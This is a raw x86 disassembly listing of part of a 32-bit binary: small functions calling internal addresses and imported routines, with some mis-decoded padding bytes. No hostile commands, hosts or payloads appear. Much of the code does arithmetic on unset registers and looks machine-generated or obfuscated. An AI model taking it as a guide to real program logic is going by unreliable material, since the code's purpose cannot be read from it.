  4d10c1:	add    esp,0x8
  4d10c4:	pop    edx
  4d10c5:	push   edx
  4d10c6:	push   0x0
  4d10c8:	call   0x4d0f14
  4d10cd:	add    esp,0x4
  4d10d0:	pop    edx
  4d10d1:	add    esp,0x20
  4d10d4:	pop    ebp
  4d10d5:	ret    
  4d10d6:	add    BYTE PTR [eax],al
  4d10d8:	pop    edi
  4d10d9:	call   DWORD PTR ds:0x4d200c
  4d10df:	call   edi
  4d10e1:	add    BYTE PTR [eax],al
  4d10e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e9:	sub    esp,0x24
  4d10ec:	lea    edi,[ebx-0x40]
  4d10ef:	add    eax,DWORD PTR [edi-0xd8]
  4d10f5:	push   edi
  4d10f6:	mov    eax,0x0
  4d10fb:	push   eax
  4d10fc:	call   0x4d0e60
  4d1101:	add    esp,0x4
  4d1104:	pop    edi
  4d1105:	push   edi
  4d1106:	push   DWORD PTR [edi+0x68]
  4d1109:	push   DWORD PTR [edi+0x18c]
  4d110f:	call   0x4d0e18
  4d1114:	add    esp,0x8
  4d1117:	pop    edi
  4d1118:	push   edi
  4d1119:	mov    esi,0xfffffff4
  4d111e:	push   esi
  4d111f:	call   0x4d142c
  4d1124:	add    esp,0x4
  4d1127:	pop    edi
  4d1128:	add    esp,0x24
  4d112b:	pop    ebp
  4d112c:	ret    
  4d112d:	add    BYTE PTR [eax],al
  4d112f:	add    BYTE PTR [edi-0x1],bl
  4d1132:	adc    eax,0x4d2030
  4d1137:	call   edi
  4d1139:	add    BYTE PTR [eax],al
  4d113b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1141:	sub    esp,0x58
  4d1144:	lea    ecx,[ebx-0x48]
  4d1147:	sub    edi,DWORD PTR [ecx+0xac]
  4d114d:	push   ecx
  4d114e:	push   0x0
  4d1150:	call   0x4d11c0
  4d1155:	add    esp,0x4
  4d1158:	pop    ecx
  4d1159:	push   ecx
  4d115a:	push   edx
  4d115b:	push   esi
  4d115c:	push   DWORD PTR [ecx+0x98]
  4d1162:	push   eax
  4d1163:	call   0x4d0cb4
  4d1168:	add    esp,0x10
  4d116b:	pop    ecx
  4d116c:	push   ecx
  4d116d:	mov    edx,0x0
  4d1172:	push   edx
  4d1173:	call   0x4d1050
  4d1178:	add    esp,0x4
  4d117b:	pop    ecx
  4d117c:	add    esp,0x58
  4d117f:	pop    ebp
  4d1180:	ret    
  4d1181:	add    BYTE PTR [eax],al
  4d1183:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1189:	sub    esp,0x50
  4d118c:	mov    esi,0x4d3170
  4d1191:	sub    DWORD PTR [esi-0x64],ecx
  4d1194:	push   esi
  4d1195:	push   edx
  4d1196:	push   DWORD PTR [esi+0x3c]
  4d1199:	push   edx
  4d119a:	push   DWORD PTR [esi+0x1ec]
  4d11a0:	call   0x4d0a80
  4d11a5:	add    esp,0x10
  4d11a8:	pop    esi
  4d11a9:	call   0x4d1228
  4d11ae:	add    esp,0x4
  4d11b1:	call   0x4d09bc
  4d11b6:	add    esp,0x4
  4d11b9:	add    esp,0x50
  4d11bc:	pop    ebp
  4d11bd:	ret    
  4d11be:	add    BYTE PTR [eax],al
  4d11c0:	pop    edi
  4d11c1:	call   DWORD PTR ds:0x4d2034
  4d11c7:	call   edi
  4d11c9:	add    BYTE PTR [eax],al
  4d11cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11d1:	sub    esp,0x38
  4d11d4:	lea    edx,ds:0x4d3198
  4d11da:	adc    DWORD PTR [edx-0x100],0xffffffbe
  4d11e1:	push   edx
  4d11e2:	push   DWORD PTR [edx+0x94]
  4d11e8:	push   eax
  4d11e9:	push   esi
  4d11ea:	push   edi
  4d11eb:	call   0x4d1290
  4d11f0:	add    esp,0x10
  4d11f3:	pop    edx
  4d11f4:	push   edx
  4d11f5:	push   0x0
  4d11f7:	call   0x4d138c
  4d11fc:	add    esp,0x4
  4d11ff:	pop    edx
  4d1200:	push   edx
  4d1201:	lea    ebx,[edx-0x198]
  4d1207:	push   ebx
  4d1208:	call   0x4d1330
  4d120d:	add    esp,0x4
  4d1210:	test   eax,eax
  4d1212:	jne    0x4d1201
  4d1214:	pop    edx
  4d1215:	add    esp,0x38
  4d1218:	pop    ebp
  4d1219:	ret    
  4d121a:	add    BYTE PTR [eax],al
  4d121c:	pop    edi
  4d121d:	call   DWORD PTR ds:0x4d205c
  4d1223:	call   edi
  4d1225:	add    BYTE PTR [eax],al
  4d1227:	add    BYTE PTR [edi-0x1],bl
  4d122a:	adc    eax,0x4d201c
  4d122f:	call   edi
  4d1231:	add    BYTE PTR [eax],al
  4d1233:	add    BYTE PTR [edi-0x1],bl
  4d1236:	adc    eax,0x4d2098
  4d123b:	call   edi
  4d123d:	add    BYTE PTR [eax],al
  4d123f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1245:	sub    esp,0x28
  4d1248:	lea    edx,ds:0x4d30b0
  4d124e:	xor    DWORD PTR [ebp-0x28],0xffffffe6
  4d1252:	push   edx
  4d1253:	push   DWORD PTR [edx+0x68]
  4d1256:	push   edi
  4d1257:	push   DWORD PTR [edx+0x1ac]
  4d125d:	push   DWORD PTR [edx+0x1f8]
  4d1263:	call   0x4d1444
  4d1268:	add    esp,0x10
  4d126b:	pop    edx
  4d126c:	push   edx
  4d126d:	mov    edi,0x0
  4d1272:	push   edi
  4d1273:	call   0x4d1050
  4d1278:	add    esp,0x4
  4d127b:	pop    edx
  4d127c:	push   edx
  4d127d:	push   0x0
  4d127f:	call   0x4d0d84
  4d1284:	add    esp,0x4
  4d1287:	pop    edx
  4d1288:	add    esp,0x28
  4d128b:	pop    ebp
  4d128c:	ret    
  4d128d:	add    BYTE PTR [eax],al
  4d128f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1295:	sub    esp,0x38
  4d1298:	lea    edi,[edx-0x70]
  4d129b:	sub    ecx,DWORD PTR [edi+0x68]
  4d129e:	push   edi
  4d129f:	push   0x0
  4d12a1:	call   0x4d0dc0
  4d12a6:	add    esp,0x4
  4d12a9:	pop    edi
  4d12aa:	push   edi
  4d12ab:	push   esi
  4d12ac:	push   ecx
  4d12ad:	push   esi
  4d12ae:	call   0x4d0ac4
  4d12b3:	add    esp,0xc
  4d12b6:	pop    edi
  4d12b7:	push   edi
  4d12b8:	push   0x0
  4d12ba:	call   0x4d12d4
  4d12bf:	add    esp,0x4
  4d12c2:	pop    edi
  4d12c3:	add    esp,0x38
  4d12c6:	pop    ebp
  4d12c7:	ret    
  4d12c8:	pop    edi
  4d12c9:	call   DWORD PTR ds:0x4d2090
  4d12cf:	call   edi
  4d12d1:	add    BYTE PTR [eax],al
  4d12d3:	add    BYTE PTR [edi-0x1],bl
  4d12d6:	adc    eax,0x4d202c
  4d12db:	call   edi
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [edi-0x1],bl
  4d12e2:	adc    eax,0x4d2084
  4d12e7:	call   edi
  4d12e9:	add    BYTE PTR [eax],al
  4d12eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12f1:	sub    esp,0x38
  4d12f4:	lea    edi,[esi+0x28]
  4d12f7:	and    edx,DWORD PTR [ebp-0x4]
  4d12fa:	push   edi
  4d12fb:	push   DWORD PTR [edi+0x60]
  4d12fe:	push   DWORD PTR [edi+0x104]
  4d1304:	call   0x4d11cc
  4d1309:	add    esp,0x8
  4d130c:	pop    edi
  4d130d:	push   edi
  4d130e:	push   0x0
  4d1310:	call   0x4d0f14
  4d1315:	add    esp,0x4
  4d1318:	pop    edi
  4d1319:	push   edi
  4d131a:	mov    edx,0x0
  4d131f:	push   edx
  4d1320:	call   0x4d1050
  4d1325:	add    esp,0x4
  4d1328:	pop    edi
  4d1329:	add    esp,0x38
  4d132c:	pop    ebp
  4d132d:	ret    
  4d132e:	add    BYTE PTR [eax],al
  4d1330:	pop    edi
  4d1331:	call   DWORD PTR ds:0x4d2014
  4d1337:	call   edi
  4d1339:	add    BYTE PTR [eax],al
  4d133b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1341:	sub    esp,0x28
  4d1344:	mov    esi,0x4d30d0
  4d1349:	or     eax,DWORD PTR [esi-0x2c]
  4d134c:	push   esi
  4d134d:	push   ecx
  4d134e:	push   ebx
  4d134f:	push   edx
  4d1350:	push   edi
  4d1351:	call   0x4d06f8
  4d1356:	add    esp,0x10
  4d1359:	pop    esi
  4d135a:	push   0x0
  4d135c:	call   0x4d0d84
  4d1361:	add    esp,0x4
  4d1364:	push   0x0
  4d1366:	call   0x4d11c0
  4d136b:	add    esp,0x4
  4d136e:	add    esp,0x28
  4d1371:	pop    ebp
  4d1372:	ret    
  4d1373:	add    BYTE PTR [edi-0x1],bl
  4d1376:	adc    eax,0x4d2080
  4d137b:	call   edi
  4d137d:	add    BYTE PTR [eax],al
  4d137f:	add    BYTE PTR [edi-0x1],bl
  4d1382:	adc    eax,0x4d2058
  4d1387:	call   edi
  4d1389:	add    BYTE PTR [eax],al
  4d138b:	add    BYTE PTR [edi-0x1],bl
  4d138e:	adc    eax,0x4d2040
  4d1393:	call   edi
  4d1395:	add    BYTE PTR [eax],al
  4d1397:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d139d:	sub    esp,0x44
  4d13a0:	lea    ebx,ds:0x4d3138
  4d13a6:	mov    DWORD PTR [ebx-0x130],0x7
  4d13b0:	push   0x0
  4d13b2:	call   0x4d12d4
  4d13b7:	add    esp,0x4
  4d13ba:	push   ebx
  4d13bb:	push   edi
  4d13bc:	push   edx
  4d13bd:	push   DWORD PTR [ebx+0xb8]
  4d13c3:	push   DWORD PTR [ebx+0x134]
  4d13c9:	call   0x4d0b0c
  4d13ce:	add    esp,0x10
  4d13d1:	pop    ebx
  4d13d2:	call   0x4d0ebc
  4d13d7:	add    esp,0x4
  4d13da:	add    esp,0x44
  4d13dd:	pop    ebp
  4d13de:	ret    
  4d13df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e5:	sub    esp,0x4c
  4d13e8:	lea    edx,[esi-0x98]
  4d13ee:	or     eax,0x5a
  4d13f1:	push   edx
  4d13f2:	push   DWORD PTR [edx+0x1b8]
  4d13f8:	push   DWORD PTR [edx+0x188]
  4d13fe:	call   0x4d077c
  4d1403:	add    esp,0x8
  4d1406:	pop    edx
  4d1407:	push   edx
  4d1408:	mov    edi,0x0
  4d140d:	push   edi
  4d140e:	call   0x4d11c0
  4d1413:	add    esp,0x4
  4d1416:	pop    edx
  4d1417:	push   edx
  4d1418:	mov    ecx,0x0
  4d141d:	push   ecx
  4d141e:	call   0x4d0e60
  4d1423:	add    esp,0x4
  4d1426:	pop    edx
  4d1427:	add    esp,0x4c
  4d142a:	pop    ebp
  4d142b:	ret    
  4d142c:	pop    edi
  4d142d:	call   DWORD PTR ds:0x4d203c
  4d1433:	call   edi
  4d1435:	add    BYTE PTR [eax],al
  4d1437:	add    BYTE PTR [edi-0x1],bl
  4d143a:	adc    eax,0x4d207c
  4d143f:	call   edi
  4d1441:	add    BYTE PTR [eax],al
  4d1443:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1449:	sub    esp,0x38
  4d144c:	lea    esi,ds:0x4d3198
  4d1452:	mov    DWORD PTR [esi+0x54],0x110d
  4d1459:	push   esi
  4d145a:	push   ecx
  4d145b:	push   DWORD PTR [esi+0x1f4]
  4d1461:	push   edx
  4d1462:	push   DWORD PTR [esi+0x54]
  4d1465:	call   0x4d13e0
  4d146a:	add    esp,0x10
  4d146d:	pop    esi
  4d146e:	lea    ebx,[esi-0x198]
  4d1474:	push   ebx
  4d1475:	call   0x4d1330
  4d147a:	add    esp,0x4
  4d147d:	test   eax,eax
  4d147f:	jne    0x4d146f
  4d1481:	mov    eax,0x0
  4d1486:	push   eax
  4d1487:	call   0x4d0d84
  4d148c:	add    esp,0x4
  4d148f:	add    esp,0x38
  4d1492:	pop    ebp
  4d1493:	ret    
  4d1494:	mov    edi,edi
  4d1496:	push   ebp
  4d1497:	mov    ebp,esp
  4d1499:	sub    esp,0x24
  4d149c:	lea    ecx,[ebx+0x54]
  4d149f:	mov    DWORD PTR [ecx-0xd0],0xffffffef
  4d14a9:	push   ecx
  4d14aa:	push   0x0
  4d14ac:	call   0x4d0d84
  4d14b1:	add    esp,0x4
  4d14b4:	pop    ecx
  4d14b5:	push   ecx
  4d14b6:	push   eax
  4d14b7:	push   eax
  4d14b8:	push   eax
  4d14b9:	push   ebx
  4d14ba:	call   0x4d0b8c
  4d14bf:	add    esp,0x10
  4d14c2:	pop    ecx
  4d14c3:	push   ecx
  4d14c4:	push   0xfffffff4
  4d14c6:	call   0x4d142c
  4d14cb:	add    esp,0x4
  4d14ce:	pop    ecx
  4d14cf:	add    esp,0x24
  4d14d2:	pop    ebp
  4d14d3:	ret    
  4d14d4:	mov    edi,edi
  4d14d6:	push   ebp
  4d14d7:	mov    ebp,esp
  4d14d9:	sub    esp,0x54
  4d14dc:	mov    ebx,0x4d3088
  4d14e1:	sub    edx,DWORD PTR [ebp-0x54]
  4d14e4:	push   ebx
  4d14e5:	push   DWORD PTR [ebx+0xb0]
  4d14eb:	push   DWORD PTR [ebx+0x198]
  4d14f1:	call   0x4d113c
  4d14f6:	add    esp,0x8
  4d14f9:	pop    ebx
  4d14fa:	mov    ecx,0x0
  4d14ff:	push   ecx
  4d1500:	call   0x4d0a68
  4d1505:	add    esp,0x4
  4d1508:	mov    eax,0x0
  4d150d:	push   eax
  4d150e:	call   0x4d0f14
  4d1513:	add    esp,0x4
  4d1516:	add    esp,0x54
  4d1519:	pop    ebp
  4d151a:	ret    
  4d151b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1521:	sub    esp,0x40
  4d1524:	lea    esi,ds:0x4d3168
  4d152a:	and    edi,DWORD PTR [ebp-0x1c]
  4d152d:	push   esi
  4d152e:	push   DWORD PTR [esi+0x11c]
  4d1534:	push   DWORD PTR [esi+0x138]
  4d153a:	push   ecx
  4d153b:	call   0x4d073c
  4d1540:	add    esp,0xc
  4d1543:	pop    esi
  4d1544:	push   0x0
  4d1546:	call   0x4d11c0
  4d154b:	add    esp,0x4
  4d154e:	push   0x0
  4d1550:	call   0x4d0d84
  4d1555:	add    esp,0x4
  4d1558:	add    esp,0x40
  4d155b:	pop    ebp
  4d155c:	ret    
  4d155d:	add    BYTE PTR [eax],al
  4d155f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1565:	sub    esp,0x58
  4d1568:	lea    esi,ds:0x4d3010
  4d156e:	cmp    esi,0x5001
  4d1574:	jbe    0x4d1563
  4d1576:	push   esi
  4d1577:	push   DWORD PTR [esi+0x1f8]
  4d157d:	push   edx
  4d157e:	call   0x4d08cc
  4d1583:	add    esp,0x8
  4d1586:	pop    esi
  4d1587:	mov    eax,0x0
  4d158c:	push   eax
  4d158d:	call   0x4d138c
  4d1592:	add    esp,0x4
  4d1595:	call   0x4d0ebc
  4d159a:	add    esp,0x4
  4d159d:	add    esp,0x58
  4d15a0:	pop    ebp
  4d15a1:	ret    
	...
